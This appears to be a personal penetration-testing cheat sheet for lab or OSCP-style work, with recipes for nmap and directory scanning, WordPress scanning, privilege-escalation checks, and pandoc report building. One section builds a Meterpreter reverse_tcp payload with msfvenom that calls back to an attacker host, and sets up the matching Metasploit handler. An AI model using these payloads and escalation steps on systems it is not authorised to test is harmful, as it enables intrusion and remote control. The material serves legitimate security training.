# Scanning

#### Nmap
The following is a list of .nse scrips and cheat sheets for nmap
```
$ nmap -sC -sV -oA nmap/OUTPUT 10.10.10.125
```
The following syntax is used for vulnerability scans within nmap
```
$ nmap --script vuln -oA nmap/OUTPUT 10.10.10.125
$ nmap --script http-enum --script-args http-enum.fingerprintfile=./myfingerprints.txt -p80 <target>  
```
#### Gobuster
Directory busting with gobuster
```
$ sudo gobuster dir -u http://10.10.10.68 -w ~/red-team/wordlists/directory-list-2.3-medium.txt
```
#### WordPress
The following tool will scan a wordpress site for known vulnerabilities and configuration items:
```
$ sudo wpscan --url https://example.com --disable-tls-checks
```
#### Manual Tricks
If 443 is open check the certificate for alternative Virtual hosts that the cert may work on.
If you find that the certificate is good for multiple subdomains/virtual hosts add them to your host file with the following command.
```
$ vi /etc/hosts

127.0.0.1         localhost
127.0.0.2         kali
10.10.10.123      www.example.com
```
# Cracking
Before we run any hashes through John the Ripper or Hash cat, lets check if anyone has cracked these hashes before.
- [HashKiller](https://hashkiller.co.uk/cracker)


# Privilege Escalation

### Windows
First lets check system info with the folloing commands.
```
C:\Users\user\Desktop> systeminfo
```
msf exploit checker:
```
msf exploit > use post/multi/recon/local_exploit_suggester
msf exploit > set SESSION 1
msf exploit > run
```
### Linux
- [GTFOBins](https://gtfobins.github.io/) is a fantastic resource for priviledge escolation within Linux.
First steps to go from low-privilege user to root on a linux box.
```
joanna@openadmin:~$ sudo -l                     
Matching Defaults entries for joanna on openadmin:                              
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\
  :/bin\:/snap/bin 
  
User joanna may run the following commands on openadmin:                         
  (ALL) NOPASSWD: /bin/nano /opt/priv                                 
  joanna@openadmin:~$ 
```
Look at what the user can sudo and try to escalation from their. 
After testing what the user can do, look to see what is running as root.
```
joanna@openadmin:~$ find / -perm -u=s -type f 2>/dev/null   
/usr/lib/openssh/ssh-keysign     
/usr/lib/eject/dmcrypt-get-device 
/usr/lib/snapd/snap-confine       
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper    
/usr/lib/policykit-1/polkit-agent-helper-1    
/usr/bin/newgrp                              
/usr/bin/pkexec         
/usr/bin/newgidmap      
/usr/bin/sudo   
/usr/bin/passwd  
/usr/bin/newuidmap
/usr/bin/chsh      
/usr/bin/traceroute6.iputils 
/usr/bin/chfn           
/usr/bin/gpasswd      
/usr/bin/at  
/bin/ping      
/bin/umount     
/bin/su        
/bin/mount     
/bin/fusermount
joanna@openadmin:~$
```

We can try and get a root shell if a service is running as root, i.e. apache. Start a python http server to transfer files to the 
compromised machine. Note that this command will host files in your current directory, so make sure you copy all files before running
the python SimpleHTTPServer.
```
$ sudo python -m SimpleHTTPServer 8888
```
# Meterpreter
Use the following to created a meterpreter shell for reverse_tcp for Windows
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f aspx -o exploit.aspx

msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
```
# Pen Test Report
#### Requirements

- [Pandoc](https://pandoc.org/installing.html)
```
sudo apt-get install pandoc
```
- LaTeX (eg. [TeX Live](http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz)) in order to get `pdflatex` or `xelatex`
```
wget http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz
tar -xzf install-tl-unx.tar.gz
cd /your/unpacked/directory
perl install-tl  # install-tl-windows on Windows
[... messages omitted ...]
Enter command: i
[... when done, see below for post-install ...]
```
Post-install: setting PATH variable
```
PATH=/usr/local/texlive/2019/bin/x86_64-linux:$PATH
```
- [Eisvogel Pandoc LaTeX PDF Template](https://github.com/Wandmalfarbe/pandoc-latex-template#installation)
```
wget https://raw.githubusercontent.com/Wandmalfarbe/pandoc-latex-template/master/eisvogel.tex
mkdir -p ~/.pandoc/templates
mv eisvogel.tex ~/.pandoc/templates/default.latex
```
```
pandoc PENTEST_REPORT.md \
-o OSCP-OS-XXXXX-Lab-Report.pdf \
--from markdown+yaml_metadata_block+raw_html \
--template eisvogel \
--table-of-contents \
--toc-depth 6 \
--number-sections \
--top-level-division=chapter \
--highlight-style breezedark
```
